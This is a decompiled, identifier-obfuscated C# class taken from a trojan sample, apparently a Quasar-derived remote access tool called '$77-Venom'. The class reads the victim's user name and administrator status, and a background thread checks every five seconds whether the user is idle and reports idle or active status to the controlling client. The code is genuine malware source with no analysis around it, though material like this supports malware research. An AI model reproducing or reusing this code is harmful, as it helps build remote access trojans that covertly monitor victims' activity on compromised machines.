// Decompiled with JetBrains decompiler
// Type: 햫耷昢ￎ蟦턈㞊�拐錡⬲펒岁ꆝ�銵裏Ґ☲
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

public static class 햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632
{
  public static 哥ꀦ堍뾐쀔\u2252븪\uFFF1ꋀ骴촠ᆙ狄瘭尔ㆦ\u3293샸\u9FE3쌶 LastUserStatus { get; set; }

  public static string \u2A83莤\uEEF7鑔羽䝛톹䓭ⴃ㕢‮\uEA57懰\uE527\uEA49晲\u08D2셙糭뚽() => Environment.UserName;

  public static string \u23E7䳓㒀㠉쬙\uA95B壳\uE222ꍹ폊Ą僦ꇊ빂詮鸦\u08E0顔䫺卓()
  {
    using (WindowsIdentity current = WindowsIdentity.GetCurrent())
    {
      if (current != null)
      {
        WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
          return "Admin";
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
          return "User";
        if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
          return "Guest";
      }
    }
    return "Unknown";
  }

  public static void 䒡ᩌ붘韔ା狾\uFFFD䰉갳硦ᴲꩳ걺愂軤랁૯䈺죙曪() => new Thread(new ThreadStart(햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.囍\uE7B8㟓爜㲶뚙艟\u33C8ﴊ䀙\uEADD\uF41C倷\uFFFD\u02C2\uF385觘잿ᢢ벑))
  {
    IsBackground = true
  }.Start();

  private static void 囍\uE7B8㟓爜㲶뚙艟\u33C8ﴊ䀙\uEADD\uF41C倷\uFFFD\u02C2\uF385觘잿ᢢ벑()
  {
    while (!\u32C8ആ밄ᩓ\uE5F8\uEDC3䩍뻾맳\u2891ꄠ\uEA2E\uFFFD赆㶆愠譃뷉븄\u18FE.Exiting)
    {
      Thread.Sleep(5000);
      if (햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.褻\uFFFD刲䄵餰廓\uE040暆櫝醷戔熍땷ꇧ刑섁滹쳽კ팽())
      {
        if (햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus != 哥ꀦ堍뾐쀔\u2252븪\uFFF1ꋀ骴촠ᆙ狄瘭尔ㆦ\u3293샸\u9FE3쌶.\u2412\uF54B\uE38CĴ鼮㫏帧\uF224뢳숅醃넟ꋮぞ膉\uFFFD㤥鯭\uF7D8ⱸ)
        {
          햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus = 哥ꀦ堍뾐쀔\u2252븪\uFFF1ꋀ骴촠ᆙ狄瘭尔ㆦ\u3293샸\u9FE3쌶.\u2412\uF54B\uE38CĴ鼮㫏帧\uF224뢳숅醃넟ꋮぞ膉\uFFFD㤥鯭\uF7D8ⱸ;
          new SetUserStatus(햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus).Execute((\u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ) \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋);
        }
      }
      else if (햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus != 哥ꀦ堍뾐쀔\u2252븪\uFFF1ꋀ骴촠ᆙ狄瘭尔ㆦ\u3293샸\u9FE3쌶.\u26D3䔃\u2109菂ሓ\uF6ED\u2012狢뗪괅沇끢\uE680程啰艄섓瑣\uED89ᑏ)
      {
        햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus = 哥ꀦ堍뾐쀔\u2252븪\uFFF1ꋀ骴촠ᆙ狄瘭尔ㆦ\u3293샸\u9FE3쌶.\u26D3䔃\u2109菂ሓ\uF6ED\u2012狢뗪괅沇끢\uE680程啰艄섓瑣\uED89ᑏ;
        new SetUserStatus(햫耷昢ￎ蟦턈㞊\uFFFD拐錡\u2B32펒\uE754岁ꆝ\uFFFD銵裏Ґ\u2632.LastUserStatus).Execute((\u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ) \u1BA6ⲓӅ뙹苳\u266Dᶬ롨塔鬪\u2244爥穳횼驸䉽괝涂ᙣ\uFFFD.\uFFFD獨ꦻ㖝텤ᑥ\u21AFٛ愱쮭꯴ꄌሚ㶓\u2BEB\u2472㓢咤\uEEED坋);
      }
    }
  }

  private static bool 褻\uFFFD刲䄵餰廓\uE040暆櫝醷戔熍땷ꇧ刑섁滹쳽კ팽()
  {
    long num = Stopwatch.GetTimestamp() - (long) \u25C4\uE968茼\uFFFD䎆㗽耷\uFFFD\u0705緭쮫洴훅ツ삾\uE07D\u9FFA嘽㗝ꚠ.頎\u0AD8\uEAD3찔泱彃\uEFA2ᢋௌﮫퟀᯭ\u00A5賗䠕㹻冋쮷\uFFFD墳();
    return (num > 0L ? num / 1000L : 0L) > 600L;
  }
}
